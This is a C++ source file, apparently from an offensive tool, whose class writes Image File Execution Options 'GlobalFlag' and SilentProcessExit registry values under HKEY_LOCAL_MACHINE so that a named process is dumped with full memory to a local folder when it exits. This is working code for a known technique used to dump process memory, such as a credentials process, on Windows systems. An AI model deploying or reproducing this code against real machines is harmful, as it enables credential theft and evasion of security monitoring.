#include "SilentProcessExitRegistrySetter.h"


SilentProcessExitRegistrySetter::SilentProcessExitRegistrySetter(std::string processName)
{
	this->m_isValid = FALSE; // Defaults to FALSE

	std::string subkeyIFEO = IFEO_REG_KEY + processName;

	LSTATUS ret = RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeyIFEO.c_str(), &this->m_hIFEORegKey);

	if (ret != ERROR_SUCCESS)
		return;
	
	// https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table
	DWORD globalFlagData = FLG_MONITOR_SILENT_PROCESS_EXIT;
	ret = RegSetValueExA(this->m_hIFEORegKey, "GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlagData, sizeof(DWORD));

	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(this->m_hIFEORegKey);
		return;
	}
		
		
	std::string subkeySPE = SILENT_PROCESS_EXIT_REG_KEY + processName;

	ret = RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeySPE.c_str(), &this->m_hSPERegKey);

	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(this->m_hIFEORegKey);
		return;
	}

	DWORD ReportingMode = MiniDumpWithFullMemory;
	std::string LocalDumpFolder = DUMP_FOLDER;
	DWORD DumpType = LOCAL_DUMP;

	// Set SilentProcessExit registry values for the target process
	ret = RegSetValueExA(this->m_hSPERegKey, "ReportingMode", 0, REG_DWORD, (const BYTE*)&ReportingMode, sizeof(DWORD));

	ret = RegSetValueExA(this->m_hSPERegKey, "LocalDumpFolder", 0, REG_SZ, (const BYTE*)LocalDumpFolder.c_str(), LocalDumpFolder.size() + 1);

	ret = RegSetValueExA(this->m_hSPERegKey, "DumpType", 0, REG_DWORD, (const BYTE*)&DumpType, sizeof(DWORD));

	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(this->m_hSPERegKey);
		RegCloseKey(this->m_hIFEORegKey);
		return;
	}

	this->m_isValid = TRUE;
}

SilentProcessExitRegistrySetter::~SilentProcessExitRegistrySetter()
{
	RegCloseKey(this->m_hSPERegKey);
	RegCloseKey(this->m_hIFEORegKey);
}

BOOL SilentProcessExitRegistrySetter::isValid()
{
	return this->m_isValid;
}
